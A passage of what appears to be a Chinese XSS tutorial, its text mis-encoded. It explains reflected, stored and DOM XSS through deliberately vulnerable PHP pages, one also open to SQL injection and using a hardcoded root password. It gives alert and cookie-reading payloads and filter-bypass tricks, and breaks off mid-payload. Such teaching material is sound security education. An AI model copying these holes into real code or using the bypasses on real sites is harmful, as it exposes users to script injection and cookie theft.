        <content type="html"><![CDATA[<blockquote><p>XSSç»ƒä¹ é¶åœº</p><p>åœ¨çº¿ï¼š</p><p><a href="https://xss.haozi.me/">https://xss.haozi.me/</a></p><p><a href="https://xssaq.com/yx/index.php">https://xssaq.com/yx/index.php</a></p><p>éœ€ä¸‹è½½å®‰è£…ï¼š</p><p><a href="https://dvwa.co.uk/">DVWA</a></p><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a></p></blockquote><h1 id="XSSç®€ä»‹"><a href="#XSSç®€ä»‹" class="headerlink" title="XSSç®€ä»‹"></a>XSSç®€ä»‹</h1><p>è·¨ç«™è„šæœ¬(Cross-site Scripting )æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡ç½‘ç«™æ³¨å…¥ç‚¹æ³¨å…¥å®¢æˆ·ç«¯å¯æ‰§è¡Œè§£æçš„payloadï¼ˆè„šæœ¬ä»£ç ï¼‰ï¼Œå½“ç”¨æˆ·è®¿é—®ç½‘é¡µæ—¶ï¼Œæ¶æ„payloadè‡ªåŠ¨åŠ è½½å¹¶æ‰§è¡Œï¼Œä»¥è¾¾åˆ°æ”»å‡»è€…ç›®çš„ï¼ˆçªƒå–cookieã€æ¶æ„ä¼ æ’­ã€é’“é±¼æ¬ºéª—ç­‰ï¼‰ã€‚<br>ä¸ºäº†é¿å…CSSï¼ˆå±‚å æ ·å¼è¡¨ï¼‰ç›¸æ··æ·†ï¼Œé€šå¸¸ç§°å®ƒä¸ºâ€XSSâ€â€ã€‚å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚</p><h1 id="XSSç±»å‹"><a href="#XSSç±»å‹" class="headerlink" title="XSSç±»å‹"></a>XSSç±»å‹</h1><h2 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h2><p>åå°„å‹XSSéæŒä¹…åŒ–ï¼Œéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ï¼Œåœ¨å‘ç”Ÿè¯·æ±‚æ—¶ï¼ŒXSSä»£ç å‡ºç°åœ¨è¯·æ±‚URLä¸­ï¼Œä½œä¸ºå‚æ•°æäº¤åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è§£æå¹¶å“åº”ã€‚å“åº”ç»“æœä¸­åŒ…å«XSSä»£ç ï¼Œæœ€åæµè§ˆå™¨è§£æå¹¶æ‰§è¡Œã€‚ä»æ¦‚å¿µä¸Šå¯ä»¥çœ‹å‡ºï¼Œåå°„å‹XSSä»£ç æ˜¯é¦–å…ˆå‡ºç°åœ¨URLä¸­çš„ï¼Œç„¶åéœ€è¦æœåŠ¡ç«¯è§£æï¼Œæœ€åéœ€è¦æµè§ˆå™¨è§£æä¹‹åXSSä»£ç æ‰èƒ½å¤Ÿæ”»å‡»ã€‚è¿™ç±»æ”»å‡»æ‰‹æ®µå¤§å¤šæ•°æ˜¯ç”¨æ¥ç›—å–ç”¨æˆ·çš„Cookieä¿¡æ¯ã€‚</p><p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108094651918.png"></p><p>æµ‹è¯•ä»£ç <code>reflected.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;åå°„å‹XSSæµ‹è¯•&lt;h2&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;reflected.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    What<span class="string">&#x27;s your name?</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    $name = $_GET[&#x27;</span>name<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">    echo &quot;Hello! &quot;.$name;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ç”¨æˆ·æäº¤çš„é¡µé¢ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ­¤æäº¤æ•°æ®ï¼Œæ•°æ®æäº¤ä¹‹åç»™åå°å¤„ç†ï¼Œå†ç”±å‰ç«¯æ˜¾ç¤ºã€‚æ‰€ä»¥è¿™ç§æ¼æ´æ•°æ®æµå‘æ˜¯ï¼š å‰ç«¯â€“&gt;åç«¯â€“&gt;å‰ç«¯ã€‚å¾ˆæ˜æ˜¾ï¼Œæ­¤è¿‡ç¨‹ä¸­æ²¡æœ‰å¯¹è¾“å…¥çš„å‚æ•°ä½œä»»ä½•è¿‡æ»¤ï¼Œå­˜åœ¨XSSã€‚<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315233801938.png" alt="image-20210315233801938"></p><p>æˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥æ¡†æˆ–URLä¸­å†™å…¥<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>è¿›è¡Œæµ‹è¯•ï¼Œå›è½¦åå¯è§xsså¼¹çª—ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315234322375.png" alt="image-20210315234322375"></p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å¯ä»¥å‘ç°ï¼Œæ’å…¥è¿›å»çš„jsè„šæœ¬è¢«å®Œå®Œå…¨å…¨çš„æ‰§è¡Œäº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315234502018.png" alt="image-20210315234502018"></p><h2 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h2><p>å­˜å‚¨å‹XSSåˆç§°ä¸ºæŒä¹…å‹XSSï¼Œæ”»å‡»è€…å°†XSSä»£ç å‘é€ç»™äº†æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨æ²¡æœ‰å¯¹è¿™äº›ä»£ç åšä»»ä½•å¤„ç†å°±ç›´æ¥å­˜å‚¨åœ¨äº†æ•°æ®åº“ä¸­ï¼Œå½“ä¸‹ä¸€ä¸ªç”¨æˆ·è®¿é—®ç½‘ç«™æ—¶ç›´æ¥ä»æ•°æ®åº“è°ƒç”¨å‡ºæ¥ä¼ ç»™å‰ç«¯ï¼Œæµè§ˆå™¨è§£æXSSä»£ç å°±é€ æˆäº†XSSæ”»å‡»ã€‚å¸¸è§çš„æ”»å‡»ç‚¹åœ¨ä¸ªäººä¿¡æ¯ã€å‘è¡¨æ–‡ç« ã€ç•™è¨€æ¿ç­‰åœ°æ–¹ã€‚è¿™ç§XSSæ¯”è¾ƒå±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œç›—çªƒcookieç­‰ã€‚</p><p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108094756253.png"></p><p>æµ‹è¯•ä»£ç <code>stored.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;å­˜å‚¨å‹XSSæµ‹è¯•&lt;h2&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;border: 1px solid&quot;</span>&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;stored.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        name:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        commentsï¼š&lt;textarea name=<span class="string">&quot;comment&quot;</span>&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;å‘è¡¨&quot;</span> /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;p&gt;è¯„è®ºåŒºï¼š&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&quot;test&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into comment values (&#x27;<span class="subst">$_POST</span>[name]&#x27;,&#x27;<span class="subst">$_POST</span>[comment]&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;select * from comment ;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;ï¼š&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;comment&quot;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„è¯„è®ºç•Œé¢ï¼Œç”¨æˆ·æäº¤æ•°æ®åä¿å­˜è‡³æ•°æ®åº“ï¼Œå†ç”±æ•°æ®åº“ä¸­è°ƒå‡ºæ•°æ®å¹¶æ˜¾ç¤ºå†ä¸‹æ–¹ã€‚æ˜¾ç„¶å¯¹å†™å…¥æ•°æ®åº“çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå­˜åœ¨XSSã€‚å­˜å‚¨å‹XSSçš„æ•°æ®æµå‘æ˜¯ï¼šå‰ç«¯â€“&gt;åç«¯â€“&gt;æ•°æ®åº“â€“&gt;åç«¯â€“&gt;å‰ç«¯ã€‚<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317212829283.png" alt="image-20210317212829283"></p><p>åœ¨è¾“å…¥æ¡†ï¼ˆå¯æ³¨å…¥ä½ç½®ï¼‰ä¸­æ’å…¥<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>ï¼Œç„¶åæäº¤ã€‚æ­¤xssä»£ç ä¼šå†™å…¥æ•°æ®åº“ï¼Œåé¢å†è®¿é—®è¿™ä¸ªé¡µé¢éƒ½ä¼šæ‰§è¡Œæ’å…¥çš„XSSä»£ç ï¼Œå‡ºç°å¼¹çª—ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317213645942.png" alt="image-20210317213645942"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317213733557.png" alt="image-20210317213733557"></p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å¯ä»¥å‘ç°ï¼Œä»æ•°æ®åº“è°ƒå‡ºæ¥çš„æ•°æ®è¢«æµè§ˆå™¨æ‰§è¡Œäº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317214235176.png" alt="image-20210317214235176"></p><h2 id="DOMå‹XSS"><a href="#DOMå‹XSS" class="headerlink" title="DOMå‹XSS"></a>DOMå‹XSS</h2><p>ä¹Ÿè¢«ç§°ä½œæœ¬åœ°è·¨ç«™ï¼Œæ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹Document Object Modelï¼ˆDOMï¼‰çš„ä¸€ç§æ¼æ´ã€‚DOMæ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€ä¸ç›¸å¹²çš„æ¥å£ï¼Œå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœä¼šæˆä¸ºå±•ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚DOMä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›å¯¹è±¡å¯ä»¥è¢«ç”¨æˆ·æ‰€æ“çºµï¼Œå¦‚urlï¼Œlocationç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMæ¥åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œæ˜¯ä»å®¢æˆ·ç«¯å–å¾—DOMä¸­çš„æ•°æ®åå¹¶åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå› æ­¤ä»…ä»æœåŠ¡å™¨ç«¯æ˜¯æ²¡æœ‰åŠæ³•é˜²å¾¡DOMå‹XSSæ¼æ´çš„ï¼Œå¦‚è‹¥DOMä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„éªŒè¯ï¼Œä¾¿ä¼šäº§ç”ŸåŸºäºDOMçš„XSSæ¼æ´ã€‚åŸºäºDOMçš„XSSæ˜¯åå°„çš„ç‰¹ä¾‹ï¼Œå…¶ä¸­JavaScriptéšè—åœ¨URLä¸­ï¼Œå¹¶åœ¨å…¶å‘ˆç°æ—¶ç”±é¡µé¢ä¸­çš„JavaScriptå–å‡ºï¼Œè€Œä¸æ˜¯åœ¨æä¾›æœåŠ¡æ—¶åµŒå…¥åˆ°é¡µé¢ä¸­ã€‚è¿™å¯ä»¥ä½¿å…¶æ¯”å…¶ä»–æ”»å‡»æ›´éšè”½ï¼Œå¹¶ä¸”ç›‘æ§é¡µé¢æ­£æ–‡çš„WAFæˆ–å…¶ä»–é˜²æŠ¤æ£€æµ‹ä¸å‡ºæ¶æ„å†…å®¹ã€‚</p><blockquote><p>å¯èƒ½è§¦å‘DOMå‹XSSçš„å±æ€§</p><p>document.refererã€window.nameã€locationã€innerHTMLã€documen.write</p></blockquote><p>æµ‹è¯•ä»£ç <code>dom.php</code>,å‚è€ƒäº<a href="https://github.com/zhuifengshaonianhanlu/pikachu">Pikachu</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;DOMå‹XSSæµ‹è¯•&lt;/h2&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">            document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">            console.log(document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;click me!&quot;</span> onclick=<span class="string">&quot;domxss()&quot;</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">&quot;dom&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å®ƒé€šè¿‡ getElementById è·å–åˆ°äº†æ ‡ç­¾ Id ä¸º textçš„å†…å®¹èµ‹å€¼ç»™strï¼Œç„¶ååˆæŠŠ str çš„å†…å®¹é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼å†™åˆ°äº† a æ ‡ç­¾çš„ href å±æ€§ä¸­ï¼Œaæ ‡ç­¾ä¼šå†™åˆ° Id ä¸º domçš„ div æ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡é—­åˆçš„æ–¹å¼æ„é€ Payload<code>#&#39;onclick=&quot;alert(document.cookie)&quot;</code>ã€‚DOMå‹XSSæ¼æ´æ•°æ®æµå‘æ˜¯ï¼š å‰ç«¯â€“&gt;æµè§ˆå™¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210316010752417.png" alt="image-20210316010752417"></p><h1 id="XSSæ¼æ´æµ‹è¯•æµç¨‹"><a href="#XSSæ¼æ´æµ‹è¯•æµç¨‹" class="headerlink" title="XSSæ¼æ´æµ‹è¯•æµç¨‹"></a>XSSæ¼æ´æµ‹è¯•æµç¨‹</h1><p><strong>é»‘ç›’æµ‹è¯•</strong></p><ol><li>åœ¨ç›®æ ‡ç«™ç‚¹ä¸Šæ‰¾åˆ°è¾“å…¥ç‚¹ï¼Œæ¯”å¦‚æœç´¢æ ï¼Œé”™è¯¯é¡µé¢ï¼Œç•™è¨€æ¿ç­‰ã€‚</li><li>è¾“å…¥ä¸€ç»„â€ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚<code>&gt;</code>,<code>&quot;</code>,<code>&#39;</code>ç­‰ï¼‰+å”¯ä¸€è¯†åˆ«å­—ç¬¦â€ï¼Œç‚¹å‡»æäº¤åï¼ŒæŸ¥çœ‹è¿”å›æºç ï¼Œæ˜¯å¦åšå¯¹åº”çš„å¤„ç†ã€‚</li><li>é€šè¿‡æœç´¢å®šä½åˆ°å”¯ä¸€è¯†åˆ«å­—ç¬¦ï¼Œç»“åˆå”¯ä¸€è¯†åˆ«å­—ç¬¦å‰åè¯­æ³•ç¡®è®¤æ˜¯å¦å¯ä»¥æ„é€ æ‰§è¡Œjsçš„æ¡ä»¶(æ„é€ é—­åˆ)ã€‚</li><li>æäº¤æ„é€ çš„è„šæœ¬ä»£ç ä»¥åŠå„ç§ç»•è¿‡å§¿åŠ¿ï¼Œçœ‹æ˜¯å¦å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œå¦‚æœæˆåŠŸæ‰§è¡Œåˆ™è¯´æ˜è¯¥ç«™ç‚¹å­˜åœ¨XSSæ¼æ´ã€‚</li></ol><p><strong>Tipsï¼š</strong></p><ol><li>é€šå¸¸æœç´¢æ å®¹æ˜“å‡ºç°åå°„å‹XSSï¼Œç•™è¨€æ¿å®¹æ˜“å‡ºç°å­˜å‚¨å‹XSSï¼›</li><li>æœ‰äº›ç½‘ç«™é‰´äºåå°å¯èƒ½å­˜åœ¨è¿‡æ»¤æªæ–½ï¼Œç»„å»ºçš„scriptå¯èƒ½ä¼šè¢«è¿‡æ»¤æ‰ï¼Œå› è€Œæ— æ³•ç”Ÿæ•ˆæˆ–è€…ç¯å¢ƒé™åˆ¶è„šæœ¬æ‰§è¡Œï¼›</li><li>é€šè¿‡å˜åŒ–ä¸åŒçš„scriptï¼Œå°è¯•ç»•è¿‡åå°çš„è¿‡æ»¤æœºåˆ¶ã€‚</li></ol><p><strong>ç™½ç›’æµ‹è¯•(ä»£ç å®¡è®¡)</strong></p><p>å…³äºXSSçš„ä»£ç å®¡è®¡ä¸»è¦å°±æ˜¯ä»æ¥æ”¶å‚æ•°çš„åœ°æ–¹å’Œä¸€äº›å…³é”®è¯å…¥æ‰‹ã€‚</p><p>PHPä¸­å¸¸è§çš„æ¥æ”¶å‚æ•°çš„æ–¹å¼æœ‰<code>$_GET</code>ã€<code>$_POST</code>ã€<code>$_REQUEST</code>ç­‰ç­‰ï¼Œå¯ä»¥æœç´¢æ‰€æœ‰æ¥æ”¶å‚æ•°çš„åœ°æ–¹ã€‚ç„¶åå¯¹æ¥æ”¶åˆ°çš„æ•°æ®è¿›è¡Œè·Ÿè¸ªï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰è¾“å‡ºåˆ°é¡µé¢ä¸­ï¼Œç„¶åçœ‹è¾“å‡ºåˆ°é¡µé¢ä¸­çš„æ•°æ®æ˜¯å¦è¿›è¡Œäº†è¿‡æ»¤å’Œhtmlç¼–ç ç­‰å¤„ç†ã€‚</p><p>ä¹Ÿå¯ä»¥æœç´¢ç±»ä¼¼echoè¿™æ ·çš„è¾“å‡ºè¯­å¥ï¼Œè·Ÿè¸ªè¾“å‡ºçš„å˜é‡æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ§åˆ¶ï¼Œå¦‚æœä»æ•°æ®åº“ä¸­å–çš„ï¼Œæ˜¯å¦èƒ½æ§åˆ¶å­˜åˆ°æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå­˜åˆ°æ•°æ®åº“ä¹‹å‰æœ‰æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ç­‰ç­‰ã€‚</p><p>å¤§å¤šæ•°ç¨‹åºä¼šå¯¹æ¥æ”¶å‚æ•°å°è£…åœ¨å…¬å…±æ–‡ä»¶çš„å‡½æ•°ä¸­ç»Ÿä¸€è°ƒç”¨ï¼Œæˆ‘ä»¬å°±éœ€è¦å®¡è®¡è¿™äº›å…¬å…±å‡½æ•°çœ‹æœ‰æ²¡æœ‰è¿‡æ»¤ï¼Œèƒ½å¦ç»•è¿‡ç­‰ç­‰ã€‚</p><p>åŒç†å®¡è®¡DOMå‹æ³¨å…¥å¯ä»¥æœç´¢ä¸€äº›jsæ“ä½œDOMå…ƒç´ çš„å…³é”®è¯è¿›è¡Œå®¡è®¡ã€‚</p><h1 id="XSS-payload"><a href="#XSS-payload" class="headerlink" title="XSS-payload"></a>XSS-payload</h1><p>æ›´å¤šå¯è§ï¼š[<a href="https://www.cnblogs.com/-mo-/p/11229183.html">WEBå®‰å…¨]XSSå‘½ä»¤æ€»ç»“ ä½œè€…ï¼šè‚–æ´‹è‚–æ©ã€</a> </p><ol><li><p>è‹¥ä½¿ç”¨ä¸€äº›å‡½æ•°å°†æ„æˆxssä»£ç çš„ä¸€äº›å…³é”®å­—ç¬¦ç»™è¿‡æ»¤äº†ï¼Œå¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;script&gt;&#x2F;&quot;,&quot;&quot;,$name);      &#x2F;&#x2F;è¿‡æ»¤&lt;script&gt;</span><br><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;\&#x2F;script&gt;&#x2F;&quot;,&quot;&quot;,$name);   &#x2F;&#x2F;è¿‡æ»¤&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æŠ€å·§ï¼šå¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡  <code>&lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;</code></p></li><li><p>è‹¥ä¸åŒºåˆ†å¤§å°å†™è¿‡æ»¤æ ‡ç­¾ï¼Œå¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;script&gt;&#x2F;i&quot;,&quot;&quot;,$name);    &#x2F;&#x2F;ä¸åŒºåˆ†å¤§å°å†™è¿‡æ»¤ &lt;script&gt;</span><br><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;\&#x2F;script&gt;&#x2F;i&quot;,&quot;&quot;,$name);  &#x2F;&#x2F;ä¸åŒºåˆ†å¤§å°å†™è¿‡æ»¤ &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æŠ€å·§ï¼šå¯ä»¥ä½¿ç”¨åµŒå¥—çš„scriptæ ‡ç­¾ç»•è¿‡  <code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p></li><li><p>è‹¥ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿‡æ»¤ä¹‹é—´çš„æ‰€æœ‰å†…å®¹ï¼Œå¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F;è¿‡æ»¤äº†&lt;script  åŠå…¶ä¹‹é—´çš„æ‰€æœ‰å†…å®¹</span><br></pre></td></tr></table></figure><p>è™½ç„¶æ— æ³•ä½¿ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾æ³¨å…¥XSSä»£ç ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡imgã€bodyç­‰æ ‡ç­¾çš„äº‹ä»¶æˆ–è€… iframe ç­‰æ ‡ç­¾çš„ src æ³¨å…¥æ¶æ„çš„ js ä»£ç ã€‚å¦‚payloadï¼š <code>&lt;img src=1 